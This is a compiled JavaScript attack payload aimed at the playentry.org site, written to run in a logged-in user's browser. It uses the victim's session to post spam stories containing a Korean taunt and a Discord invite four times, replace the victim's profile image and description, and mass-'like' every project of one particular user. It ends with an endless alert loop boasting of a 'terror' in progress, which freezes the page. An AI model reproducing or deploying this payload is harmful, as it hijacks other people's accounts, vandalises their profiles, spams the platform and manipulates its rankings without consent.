var $jscomp=$jscomp||{};$jscomp.scope={};$jscomp.createTemplateTagFirstArg=function(a){return a.raw=a};$jscomp.createTemplateTagFirstArgWithRaw=function(a,b){a.raw=b;return a};
for(var i=0;4>i;i++)fetch("https://playentry.org/graphql",{headers:{"content-type":"application/json"},body:'{"query":"mutation CREATE_ENTRYSTORY($content: String, $text: String, $image: String, $sticker: String, $cursor: String) {\\n  createEntryStory(\\n    content: $content\\n    text: $text\\n    image: $image\\n    sticker: $sticker\\n    cursor: $cursor\\n  ) {\\n    warning\\n    discuss {\\n      id\\n      title\\n      content\\n      seContent\\n      created\\n      commentsLength\\n      likesLength\\n      visit\\n      category\\n      prefix\\n      groupNotice\\n      user {\\n        id\\n        nickname\\n        username\\n        profileImage {\\n          id\\n          name\\n          label {\\n            ko\\n            en\\n            ja\\n            vn\\n            __typename\\n          }\\n          filename\\n          imageType\\n          dimension {\\n            width\\n            height\\n            __typename\\n          }\\n          trimmed {\\n            filename\\n            width\\n            height\\n            __typename\\n          }\\n          __typename\\n        }\\n        status {\\n          following\\n          follower\\n          __typename\\n        }\\n        description\\n        role\\n        __typename\\n      }\\n      images {\\n        filename\\n        imageUrl\\n        __typename\\n      }\\n      progress\\n      thumbnail\\n      reply\\n      bestComment {\\n        id\\n        user {\\n          id\\n          nickname\\n          username\\n          profileImage {\\n            id\\n            name\\n            label {\\n              ko\\n              en\\n              ja\\n              vn\\n              __typename\\n            }\\n            filename\\n            imageType\\n            dimension {\\n              width\\n              height\\n              __typename\\n            }\\n            trimmed {\\n              filename\\n              width\\n              height\\n              __typename\\n            }\\n            __typename\\n          }\\n          status {\\n            following\\n            follower\\n            __typename\\n          }\\n          description\\n          role\\n          __typename\\n        }\\n        content\\n        created\\n        removed\\n        blamed\\n        commentsLength\\n        likesLength\\n        isLike\\n        hide\\n        image {\\n          id\\n          name\\n          label {\\n            ko\\n            en\\n            ja\\n            vn\\n            __typename\\n          }\\n          filename\\n          imageType\\n          dimension {\\n            width\\n            height\\n            __typename\\n          }\\n          trimmed {\\n            filename\\n            width\\n            height\\n            __typename\\n          }\\n          __typename\\n        }\\n        sticker {\\n          id\\n          name\\n          label {\\n            ko\\n            en\\n            ja\\n            vn\\n            __typename\\n          }\\n          filename\\n          imageType\\n          dimension {\\n            width\\n            height\\n            __typename\\n          }\\n          trimmed {\\n            filename\\n            width\\n            height\\n            __typename\\n          }\\n          __typename\\n        }\\n        __typename\\n      }\\n      blamed\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n","operationName":"CREATE_ENTRYSTORY","variables":{"content":"\uadf8\uac70 \uc790\uc758\uc2dd \uacfc\uc789\uc784 https://discord.gg/P7qyghFaGM"}}',method:"POST"});
fetch("https://playentry.org/graphql",{headers:{"content-type":"application/json"},body:'{"query":"\\n    mutation UPDATE_USERINFO (\\n        $profileImage: String, \\n        $coverImage: String, \\n        $description: String,\\n        $nickname: String,\\n        $gender: String\\n        $mobileKey: String\\n    ) {\\n        updateUserInfo(\\n            profileImage: $profileImage, \\n            coverImage: $coverImage, \\n            description: $description\\n            nickname: $nickname\\n            gender: $gender\\n            mobileKey: $mobileKey\\n        ) {\\n            \\n    status\\n    result\\n\\n        }\\n    }\\n","variables":{"profileImage":"62961dc9c90f55af7392960f"}}',
method:"POST"});
fetch("https://playentry.org/graphql",{headers:{"content-type":"application/json"},body:'{"query":"\\n    mutation UPDATE_USERINFO (\\n        $profileImage: String, \\n        $coverImage: String, \\n        $description: String,\\n        $nickname: String,\\n        $gender: String\\n        $mobileKey: String\\n    ) {\\n        updateUserInfo(\\n            profileImage: $profileImage, \\n            coverImage: $coverImage, \\n            description: $description\\n            nickname: $nickname\\n            gender: $gender\\n            mobileKey: $mobileKey\\n        ) {\\n            \\n    status\\n    result\\n\\n        }\\n    }\\n","variables":{"description":"\uadf8\uac70 \uc790\uc758\uc2dd \uacfc\uc789\uc784 https://discord.gg/P7qyghFaGM"}}',method:"POST"});
fetch("https://playentry.org/graphql",{headers:{"content-type":"application/json"},body:'{"query":"\\n    query SELECT_USER_PROJECTS(\\n        \\n    $user: String!\\n    $query: String\\n    $categoryCode: String\\n    $groupId: ID\\n    $pageParam: PageParam\\n    $isOpen: Boolean\\n    $except: [ID]\\n    $searchAfter: JSON\\n    $searchType: String\\n\\n    ) {\\n        userProjectList(\\n            \\n    user: $user\\n    query: $query\\n    categoryCode: $categoryCode\\n    groupId: $groupId\\n    pageParam: $pageParam\\n    isOpen: $isOpen\\n    except: $except\\n    searchAfter: $searchAfter\\n    searchType: $searchType\\n\\n    ) {\\n            total\\n            list {\\n                \\n    id\\n    name\\n    user {\\n        id\\n        username\\n        nickname\\n        profileImage {\\n            id\\n            filename\\n            imageType\\n        }\\n    }\\n    thumb\\n    isopen\\n    isPracticalCourse\\n    category\\n    categoryCode\\n    created\\n    updated\\n    special\\n    isForLecture\\n    isForStudy\\n    isForSubmit\\n    hashId\\n    complexity\\n    staffPicked\\n    ranked\\n    visit\\n    likeCnt\\n    comment\\n\\n            }\\n            searchAfter\\n        }\\n    }\\n","variables":{"searchType":"scroll","user":"618237cd602eab013a55bea2","term":"all","pageParam":{"display":122,"sort":"created"}}}',
method:"POST"}).then(function(a){return a.json()}).then(function(a){a=a.data.userProjectList.list;console.log(a);a.forEach(function(b){fetch("https://playentry.org/graphql",{headers:{"content-type":"application/json"},body:'{"query":"\\n    mutation LIKE($target: String, $targetSubject: String, $targetType: String, $groupId: ID) {\\n        like(target: $target, targetSubject: $targetSubject, targetType: $targetType, groupId: $groupId) {\\n            \\n    target\\n    targetSubject\\n    targetType\\n\\n        }\\n    }\\n","variables":{"target":"'+
b.id+'","targetSubject":"project","targetType":"individual"}}',method:"POST"})})});for(var i$0=0;-1<i$0;i$0++)alert("\uc218\uc6a9\uc18c \ud14c\ub7ec\uac00 \uc9c4\ud589\uc911\uc785\ub2c8\ub2e4...(\ud604\uc7ac "+i$0+"\ud68c \ud14c\ub7ec \uc131\uacf5.)");